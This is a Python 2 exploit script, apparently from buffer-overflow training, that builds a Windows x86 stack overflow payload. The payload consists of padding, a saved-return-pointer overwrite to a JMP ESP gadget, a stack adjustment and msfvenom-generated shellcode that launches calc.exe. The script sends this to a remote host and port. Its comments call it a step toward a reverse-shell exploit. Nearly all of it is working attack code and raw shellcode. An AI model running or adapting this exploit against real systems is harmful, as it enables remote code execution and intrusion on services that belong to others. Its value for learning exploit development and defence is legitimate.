#!/usr/bin/env python

# Uses opcode to pop calc as part of the process in developing a Windows x86
# reverse shell stack buffer overflow
# Saved Return Pointer overwrite exploit.
# Parameters are saved in params.py for persistence.
# Delete params.py and params.pyc to reset them; or simply edit params.py
#
# Written by y0k3L
# Credit to Justin Steven and his 'dostackbufferoverflowgood' tutorial
# https://github.com/justinsteven/dostackbufferoverflowgood

import struct, functions

# get parameters
RHOST = functions.getRhost()
RPORT = functions.getRport()
buf_totlen = functions.getBufTotlen()
offset_srp = functions.getOffsetSrp()
ptr_jmp_esp = functions.getPtrJmpEsp()

print "RHOST=%s; RPORT=%s; buf_totlen=%s; offset_srp=%s; ptr_jmp_esp=%s" % (RHOST, RPORT, buf_totlen, offset_srp, hex(ptr_jmp_esp))

# instead of using NOPs, drag ESP up the stack to avoid GetPC issues
# note: when modifying ESP, always ensure that it remains divisible by 4
sub_esp_10 = "\x83\xec\x10"

# pop calc opcode
# msfvenom -p windows/exec -b '\x00\x0A\x0D' -f python -v shellcode_calc CMD=calc.exe EXITFUNC=thread
shellcode_calc =  ""
shellcode_calc += "\xba\x1f\xf7\xf4\xb9\xdb\xc6\xd9\x74\x24"
shellcode_calc += "\xf4\x5e\x31\xc9\xb1\x31\x83\xc6\x04\x31"
shellcode_calc += "\x56\x0f\x03\x56\x10\x15\x01\x45\xc6\x5b"
shellcode_calc += "\xea\xb6\x16\x3c\x62\x53\x27\x7c\x10\x17"
shellcode_calc += "\x17\x4c\x52\x75\x9b\x27\x36\x6e\x28\x45"
shellcode_calc += "\x9f\x81\x99\xe0\xf9\xac\x1a\x58\x39\xae"
shellcode_calc += "\x98\xa3\x6e\x10\xa1\x6b\x63\x51\xe6\x96"
shellcode_calc += "\x8e\x03\xbf\xdd\x3d\xb4\xb4\xa8\xfd\x3f"
shellcode_calc += "\x86\x3d\x86\xdc\x5e\x3f\xa7\x72\xd5\x66"
shellcode_calc += "\x67\x74\x3a\x13\x2e\x6e\x5f\x1e\xf8\x05"
shellcode_calc += "\xab\xd4\xfb\xcf\xe2\x15\x57\x2e\xcb\xe7"
shellcode_calc += "\xa9\x76\xeb\x17\xdc\x8e\x08\xa5\xe7\x54"
shellcode_calc += "\x73\x71\x6d\x4f\xd3\xf2\xd5\xab\xe2\xd7"
shellcode_calc += "\x80\x38\xe8\x9c\xc7\x67\xec\x23\x0b\x1c"
shellcode_calc += "\x08\xaf\xaa\xf3\x99\xeb\x88\xd7\xc2\xa8"
shellcode_calc += "\xb1\x4e\xae\x1f\xcd\x91\x11\xff\x6b\xd9"
shellcode_calc += "\xbf\x14\x06\x80\xd5\xeb\x94\xbe\x9b\xec"
shellcode_calc += "\xa6\xc0\x8b\x84\x97\x4b\x44\xd2\x27\x9e"
shellcode_calc += "\x21\x3c\xca\x0b\x5f\xd5\x53\xde\xe2\xb8"
shellcode_calc += "\x63\x34\x20\xc5\xe7\xbd\xd8\x32\xf7\xb7"
shellcode_calc += "\xdd\x7f\xbf\x24\xaf\x10\x2a\x4b\x1c\x10"
shellcode_calc += "\x7f\x28\xc3\x82\xe3\x81\x66\x23\x81\xdd"

buf = ""
buf += "A" * (offset_srp - len(buf))    # padding
buf += struct.pack("<I", ptr_jmp_esp)   # SRP overwrite
buf += sub_esp_10                       # ESP points here
buf += shellcode_calc
buf += "D" * (buf_totlen - len(buf))    # trailing padding
buf += "\n"

# print buf

sent = functions.sendBuffer(RHOST, RPORT, buf)

if sent is 0:
    print "Calc popped???"
